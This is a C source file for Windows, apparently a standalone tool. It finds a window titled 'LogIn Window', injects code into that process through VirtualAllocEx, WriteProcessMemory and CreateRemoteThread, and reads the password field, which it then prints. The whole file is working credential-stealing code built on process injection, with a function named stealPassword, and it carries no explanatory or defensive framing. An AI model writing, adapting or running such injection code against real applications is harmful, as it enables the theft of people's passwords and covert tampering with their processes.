#include <stdio.h>
#include <Windows.h>
#include <string>

#define CODE_SIZE 0x1000
#define DATA_SIZE 0x500
#define PASSWORD_CONTROL_ID 1002

struct THREAD_ARG{
	HWND hWindow;
	LPVOID passwordAddr;
	LPVOID fLoadLibrary;
	LPVOID fGetProcAddress;
	char sUser32[20];
	char sMs[20];
	char sGetDlgItem[20];
	char sGetWindowTextA[20];
	char sStrcpy[20];
};

typedef HMODULE __stdcall aLoadLibrary(LPCTSTR lpFileName);
typedef FARPROC __stdcall aGetProcAddress(HMODULE hModule, LPCSTR  lpProcName);
typedef HWND __stdcall aGetDlgItem(HWND hDlg, int nIDDlgItem);
typedef int __stdcall aGetWindowText(HWND hWnd, LPTSTR lpString, int nMaxCount);
typedef char * __cdecl aStrcpy(char * destination, const char * source);

int __stdcall stealPassword(THREAD_ARG * arg){
	int res = -1;
	char password[MAXBYTE+1];

	HMODULE hUser32 = ((aLoadLibrary*)arg->fLoadLibrary) (arg->sUser32);
	HMODULE hMS = ((aLoadLibrary*)arg->fLoadLibrary) (arg->sMs);

	if (hUser32 && hMS){
		aGetDlgItem * getDlgItem = (aGetDlgItem *)((aGetProcAddress*)arg->fGetProcAddress) (hUser32, arg->sGetDlgItem);
		aGetWindowText * getWindowText = (aGetWindowText *)((aGetProcAddress*)arg->fGetProcAddress) (hUser32, arg->sGetWindowTextA);
		aStrcpy * fStrcpy = (aStrcpy *)((aGetProcAddress*)arg->fGetProcAddress) (hMS, arg->sStrcpy);

		if (getDlgItem && getWindowText && fStrcpy){
			HWND hControl = getDlgItem(arg->hWindow, PASSWORD_CONTROL_ID);
			if (hControl){
				if (getWindowText(hControl, password, MAXBYTE) > 0){
					res = 1;
					fStrcpy((char*)arg->passwordAddr, password);
				}
			}
		}
	}

	return res;
}

int main(){
	HWND hWindow;
	printf("Searching for windows.\n");

	do{
		hWindow = FindWindow(NULL, "LogIn Window");
		Sleep(500);
	} while (hWindow == NULL);
	
	printf("Windows found!.\n");

	DWORD pid;
	GetWindowThreadProcessId(hWindow, &pid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (hProcess){
		void * addr = VirtualAllocEx(hProcess, NULL, CODE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		void * dataAddr = VirtualAllocEx(hProcess, NULL, DATA_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (addr && dataAddr){
			SIZE_T bytesWritten;

			THREAD_ARG arg;
			arg.hWindow = hWindow;
			HMODULE hKernel32 = LoadLibrary("kernel32.dll");
			arg.passwordAddr = (void*)((DWORD)dataAddr + sizeof(THREAD_ARG));
			arg.fLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
			arg.fGetProcAddress = GetProcAddress(hKernel32, "GetProcAddress");
			strcpy(arg.sUser32, "user32.dll");
			strcpy(arg.sMs,"msvcrt.dll");
			strcpy(arg.sGetDlgItem,"GetDlgItem");
			strcpy(arg.sGetWindowTextA,"GetWindowTextA");
			strcpy(arg.sStrcpy, "strcpy");

			if (arg.fLoadLibrary && arg.fGetProcAddress &&
				WriteProcessMemory(hProcess, addr, stealPassword, CODE_SIZE, &bytesWritten) &&
				WriteProcessMemory(hProcess, dataAddr, &arg, sizeof(THREAD_ARG), &bytesWritten)){
				
				HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)addr, dataAddr, NULL, NULL);
				if (hThread){
					printf("Waiting for injected thread to finish.\n");
					WaitForSingleObject(hThread, INFINITE);
					DWORD exitCode;
					GetExitCodeThread(hThread, &exitCode);
					if (exitCode == 1){
						char password[MAXBYTE+1];
						SIZE_T bytesReaded;
						if (ReadProcessMemory(hProcess, arg.passwordAddr, password, sizeof(password) - 1, &bytesReaded)){
							printf("Password: %s\n", password);
						}
						else{
							printf("Failed reading password string.\n");
						}
					}
					else{
						printf("Error happened on injected thread.\n");
					}
				}
				else{
					printf("Fail injecting thread.\n");
				}
				CloseHandle(hThread);
			}
			else{
				printf("Fail writing to process: %X\n", GetLastError());
			}
		}
		else{
			printf("Can't allocate memory on process.\n");
		}
		VirtualFreeEx(hProcess, addr, CODE_SIZE, MEM_RELEASE);
		VirtualFreeEx(hProcess, dataAddr, DATA_SIZE, MEM_RELEASE);
	}
	else{
		printf("Error opening process.\n");
	}

	CloseHandle(hProcess);
	system("pause");

	return 0;
}